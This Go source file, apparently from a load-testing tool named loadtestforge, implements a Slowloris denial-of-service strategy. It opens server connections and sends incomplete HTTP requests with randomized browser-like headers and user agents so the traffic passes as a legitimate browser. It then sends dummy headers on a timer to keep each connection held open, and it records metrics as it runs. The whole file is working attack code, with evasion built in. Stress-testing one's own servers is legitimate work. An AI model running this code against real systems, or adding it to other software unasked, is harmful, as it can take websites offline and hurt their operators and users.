package strategy

import (
	"context"
	"sync/atomic"
	"time"

	"github.com/jdw/loadtestforge/internal/config"
	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"
)

// Slowloris implements the Slowloris attack with browser mimicry.
// It sends incomplete HTTP requests with Connection: keep-alive header
// to appear as a legitimate browser while holding server connections.
type Slowloris struct {
	keepAliveInterval time.Duration
	connConfig        netutil.ConnConfig
	headerRandomizer  *httpdata.HeaderRandomizer
	activeConnections int64
	metricsCallback   MetricsCallback
}

func NewSlowloris(keepAliveInterval time.Duration, bindIP string) *Slowloris {
	return &Slowloris{
		keepAliveInterval: keepAliveInterval,
		connConfig:        netutil.DefaultConnConfig(bindIP),
		headerRandomizer:  httpdata.DefaultHeaderRandomizer(),
	}
}

// SetMetricsCallback sets the metrics callback for telemetry.
func (s *Slowloris) SetMetricsCallback(callback MetricsCallback) {
	s.metricsCallback = callback
}

func (s *Slowloris) Execute(ctx context.Context, target Target) error {
	connID := generateConnID()
	startTime := time.Now()

	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	// Record connection start
	if s.metricsCallback != nil {
		s.metricsCallback.RecordConnectionStart(connID, mc.RemoteAddr().String())
	}

	userAgent := httpdata.RandomUserAgent()

	// Send incomplete HTTP request with browser-like headers
	incompleteRequest := s.headerRandomizer.BuildIncompleteRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(incompleteRequest), config.DefaultWriteTimeout); err != nil {
		if s.metricsCallback != nil {
			s.metricsCallback.RecordSocketTimeout()
		}
		return err
	}

	// Record initial success
	if s.metricsCallback != nil {
		s.metricsCallback.RecordSuccessWithLatency(time.Since(startTime))
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-mc.Context().Done():
			if s.metricsCallback != nil {
				s.metricsCallback.RecordConnectionEnd(connID)
			}
			return nil
		case <-ticker.C:
			header := httpdata.GenerateDummyHeader()
			if _, err := mc.WriteWithTimeout([]byte(header), config.DefaultWriteTimeout); err != nil {
				if s.metricsCallback != nil {
					s.metricsCallback.RecordSocketTimeout()
					s.metricsCallback.RecordConnectionEnd(connID)
				}
				return err
			}
			// Record activity
			if s.metricsCallback != nil {
				s.metricsCallback.RecordConnectionActivity(connID)
			}
		}
	}
}

func (s *Slowloris) Name() string {
	return "slowloris"
}

func (s *Slowloris) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}

// generateConnID generates a unique connection ID for logging.
func generateConnID() string {
	return httpdata.GenerateSessionID()[:8]
}
